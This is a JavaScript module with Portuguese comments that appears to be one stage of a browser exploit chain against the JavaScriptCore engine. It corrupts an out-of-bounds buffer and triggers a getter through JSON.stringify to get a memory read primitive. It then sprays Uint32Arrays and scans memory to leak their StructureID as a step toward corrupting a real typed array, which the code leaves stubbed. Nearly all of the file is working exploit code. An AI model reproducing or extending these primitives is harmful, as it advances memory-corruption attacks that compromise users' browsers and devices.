// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.10";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_10";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180; // Onde o QWORD lido (JSCell) será copiado

let getter_copy_called_flag_v10_10 = false;

// !!!!! ESTE VALOR SERÁ O ALVO DA DESCOBERTA DESTE SCRIPT !!!!!
let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null; 
// Se a descoberta falhar, este placeholder será usado, mas o objetivo é substituí-lo.
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 38; // Novo placeholder para v10.10


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOOBOffsetViaCopy_v10_10 - VALIDADA)
// ============================================================
async function readFromOOBOffsetViaCopy_v10_10(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_10`;
    getter_copy_called_flag_v10_10 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0xCAFE0000 | (dword_source_offset_to_read_from & 0xFF)); // Parte alta pode ser qualquer coisa
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);
    
    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_10 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                    }
                } else {
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8);
                }
            } catch (e_getter) {
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_10_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5);

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_copy_called_flag_v10_10) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA (v10.10)
// ============================================================
async function getStructureIDFromOOB_v10_10(offset_of_jscell_in_oob) {
    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        return null;
    }
    const copied_qword = await readFromOOBOffsetViaCopy_v10_10(offset_of_jscell_in_oob);
    if (copied_qword &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) &&
        !(copied_qword.low() === 0xBAD68BAD && copied_qword.high() === 0xBAD68BAD) ) {
        return copied_qword.low();
    }
    return null;
}

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.10 - Foco Descoberta de SID)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverSID_v10.10`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de StructureID de Uint32Array ---`, "test", FNAME_CURRENT_TEST);

    let sprayedU32Arrays = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   AVISO IMPORTANTE: Este script tentará descobrir o StructureID de Uint32Array.`, "info", FNAME_CURRENT_TEST);
        logS3(`   Se bem-sucedido, copie o valor para a constante EXPECTED_UINT32ARRAY_STRUCTURE_ID.`, "warn", FNAME_CURRENT_TEST);


        // --- PASSO 1: Validar rapidamente a primitiva de leitura de SID ---
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
        if (typeof known_ab_sid === 'number') {
            const FAKE_AB_CELL_OFFSET = 0x3F0; // Offset um pouco diferente
            const fake_ab_jscell_qword = new AdvancedInt64(known_ab_sid, 0x01000100 | (known_ab_sid >> 24) ); // Variar um pouco as flags
            oob_write_absolute(FAKE_AB_CELL_OFFSET, fake_ab_jscell_qword, 8);
            let sid_read_from_fake_ab = await getStructureIDFromOOB_v10_10(FAKE_AB_CELL_OFFSET);
            if (sid_read_from_fake_ab !== null && sid_read_from_fake_ab === fake_ab_jscell_qword.low()) {
                logS3("  PASSO 1: Primitiva de leitura de SID validada com sucesso (usando ArrayBuffer falso).", "good", FNAME_CURRENT_TEST);
            } else {
                logS3("  PASSO 1: AVISO - Falha ao validar primitiva de leitura de SID com ArrayBuffer falso.", "warn", FNAME_CURRENT_TEST);
                logS3(`    Lido: ${toHex(sid_read_from_fake_ab)}, Esperado: ${toHex(fake_ab_jscell_qword.low())}`, "warn", FNAME_CURRENT_TEST);
                // Não parar, mas a descoberta de SID pode não ser confiável.
            }
        } else {
             logS3("  PASSO 1: AVISO - ArrayBuffer_STRUCTURE_ID não definido, pulando validação da primitiva de SID.", "warn", FNAME_CURRENT_TEST);
        }
        await PAUSE_S3(50);

        // --- PASSO 2: Pulverizar Uint32Arrays e tentar encontrar seus StructureIDs ---
        logS3("PASSO 2: Pulverizando Uint32Arrays para descoberta de SID...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 300; // Aumentar ainda mais o spray
        const U32_SPRAY_LEN_BASE = 4; // Usar arrays bem pequenos para pulverizar mais metadados
        sprayedU32Arrays = [];
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedU32Arrays.push(new Uint32Array(U32_SPRAY_LEN_BASE + (i % 8))); // Variar tamanho de 4 a 11
        }
        logS3(`  ${sprayedU32Arrays.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(500); // Dar mais tempo para a heap assentar

        let found_sids_map = {};
        const SCAN_START = 0x080; // Começar um pouco mais cedo
        const SCAN_END = Math.min(0x7C00, oob_array_buffer_real.byteLength - 0x20); // Escanear grande parte do buffer (até ~31KB)
        const SCAN_STEP_SID = 0x04; // Escanear MUITO densamente (a cada 4 bytes)

        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs... (EXTREMAMENTE LENTO!)`, "warn", FNAME_CURRENT_TEST);
        let sids_found_in_scan = 0;
        
        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
            let sid = await getStructureIDFromOOB_v10_10(offset);
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF) {
                if (typeof known_ab_sid === 'number' && (sid & 0xFFFFFF00) === (known_ab_sid & 0xFFFFFF00)) {
                    continue; // Ignora SIDs que parecem ser de ArrayBuffer
                }
                if ((sid & 0xFFFF0000) === 0xCAFE0000 || (sid & 0xFFFF0000) === 0xBADB0000 ) { // Ignora nossos padrões de preenchimento
                    continue;
                }
                
                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
                sids_found_in_scan++;

                // Logar com menos frequência para não inundar
                if (found_sids_map[sid] <= 3) {
                     logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)} (Contagem: ${found_sids_map[sid]})`, "leak", FNAME_CURRENT_TEST);
                }
            }
            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 512) === 0) { // Log de progresso a cada ~2KB (512 * 4 bytes)
                logS3(`    Scan em ${toHex(offset)}... SIDs únicos candidatos: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(1); 
            }
        }
        logS3(`  Scan concluído. Total de ${sids_found_in_scan} SIDs potenciais (filtrados) encontrados.`, "info", FNAME_CURRENT_TEST);

        let sorted_sids = Object.keys(found_sids_map).map(k => parseInt(k)).sort((a,b) => found_sids_map[b] - found_sids_map[a]);

        logS3("  Frequência dos SIDs encontrados (top 10 mais frequentes):", "info", FNAME_CURRENT_TEST);
        let displayed_sids = 0;
        for(let i=0; i < sorted_sids.length && displayed_sids < 10; i++) {
            const sid_val = sorted_sids[i];
            // Filtro adicional para SIDs que parecem mais "reais" (ex: não são valores muito pequenos ou muito grandes e estranhos)
            if (found_sids_map[sid_val] > 1 && sid_val > 0x1000) { 
                logS3(`    - SID: ${toHex(sid_val)}  Contagem: ${found_sids_map[sid_val]}`, "info", FNAME_CURRENT_TEST);
                displayed_sids++;
            }
        }
        
        if (sorted_sids.length > 0) {
            most_frequent_sid_val = sorted_sids[0];
            max_freq = found_sids_map[most_frequent_sid_val];
            // Condição mais robusta para aceitar um SID: alta frequência e não ser um valor "óbvio" de lixo.
             if (max_freq > Math.min(NUM_U32_SPRAY / 10, 10) && most_frequent_sid_val > 0x1000) { // Pelo menos 10% do spray, ou 10, e > 0x1000
                EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
                logS3(`  !!!! StructureID MAIS FREQUENTE (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
                logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
                document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
            } else {
                logS3("  Nenhum candidato a StructureID de Uint32Array suficientemente proeminente/confiável encontrado.", "warn", FNAME_CURRENT_TEST);
                EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
            }
        } else {
             logS3("  Nenhum SID candidato encontrado após filtros.", "warn", FNAME_CURRENT_TEST);
             EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);

        // --- PASSO 3: Usar o SID descoberto (ou placeholder) para tentar corromper um Uint32Array real ---
        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
            logS3(`PASSO 3: Tentando corromper um Uint32Array real usando SID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}... (LÓGICA FUTURA)`, "info", FNAME_CURRENT_TEST);
            // A lógica da v10.4 (Passo 3) para encontrar, corromper e testar o superArray iria aqui.
        } else {
            logS3("PASSO 3: Sem StructureID de Uint32Array confiável, corrupção direcionada é adiada.", "info", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedU32Arrays = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
